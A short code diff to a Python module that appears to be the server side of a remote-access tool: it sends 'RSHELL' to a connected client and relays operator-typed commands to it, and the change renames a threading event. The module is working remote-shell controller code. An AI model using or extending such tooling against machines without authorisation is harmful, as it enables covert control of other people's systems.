@@ -4,25 +4,23 @@ import threading
 
 from colorama import Style
 
-from Server.console_handler import command_finished
+from Server.console_handler import inactive
 
 requires_id = True
 
 
 def execute(conn, args, clients, id):
-    command_finished.clear()
+    inactive.clear()
     conn.sendall(b'RSHELL')
     threading.Thread(target=rshell_thread, args=(conn,), daemon=True).start()
-    command_finished.clear()  # Clear the event here
-
-
+    inactive.set()
 
 def rshell_thread(conn):
     hostname = conn.getpeername()[0]
     while True:
         command = input("<" + hostname + ">:" + Style.RESET_ALL)
         if command.lower() == 'exit':
-            command_finished.set()
+            inactive.set()
             break
         conn.sendall(command.encode())
         results = b''
